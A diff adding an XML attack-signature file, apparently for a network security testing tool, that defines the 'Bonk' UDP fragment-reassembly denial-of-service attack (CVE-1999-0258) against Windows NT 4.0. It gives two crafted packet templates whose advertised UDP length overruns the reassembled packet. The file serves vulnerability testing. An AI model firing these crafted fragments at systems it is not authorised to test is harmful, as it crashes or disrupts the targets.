@@ -1,0 +1,71 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <SoftwareRevision display="true" value="1.4"/>
+    <ExecDesc value="Fragment Reassembly: Bonk Attack" display="true"/>
+    <EngDesc value="This threat sends a UDP packet broken into two fragments.  The advertised UDP header length is longer than the actual reassembled packet." display="true"/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Denial_of_Service"/>
+      <item value="Fragmentation"/>
+    </Intent>
+    <Protocol value="UDP" display="true"/>
+    <Type_Of_Equipment value="Protocol" display="true"/>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Windows"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Windows_NT_4.0_Service_Pack_1"/>
+      <item value="Windows_NT_4.0_Service_Pack_2"/>
+      <item value="Windows_NT_4.0_Service_Pack_3"/>
+    </Known_Versions_Affected>
+    <Credit value="http://www.insecure.org/sploits/95.NT.fragmentation.bonk.html" display="true"/>
+    <CVEID display="true" value="CVE-1999-0258"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="5730"/>
+    <Author value="Chuck McAuley" display="true"/>
+    <ID value="c490ad6b3540480c5a04ce20ab5fbb65" display="true"/>
+    <Revision value="1" display="true"/>
+    <Suite display="true" value="Standard"/>
+    <AccessVector value="remote"/>
+    <AccessComplexity value="low"/>
+    <Authentication value="not-required"/>
+    <ConfImpact value="none"/>
+    <IntegImpact value="none"/>
+    <AvailImpact value="partial"/>
+    <ImpactBias value="normal"/>
+    <Created value="1143176901" display="true"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MACAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MACAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A"/>
+    <for index="B"/>
+    <for index="C"/>
+    <for index="D"/>
+    <for index="E"/>
+    <for index="F"/>
+    <for index="G"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMAC="$sourceMAC" destMAC="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="" TotalLength="" Identification="10" FragmentOffset="0" TTL="20" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="true">
+        <UDP srcPort="1025" destPort="$destPort" checksum="" length="24" Payload="00000000000000000000000000000000000000000000000000000000"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="B" Count="">
+    <Ethernet srcMAC="$sourceMAC" destMAC="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="" TotalLength="" Identification="10" FragmentOffset="4" TTL="20" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" Payload="00000000" CE="false" DF="true" MF="false"/>
+    </Ethernet>
+  </Output>
+</threatSignature>
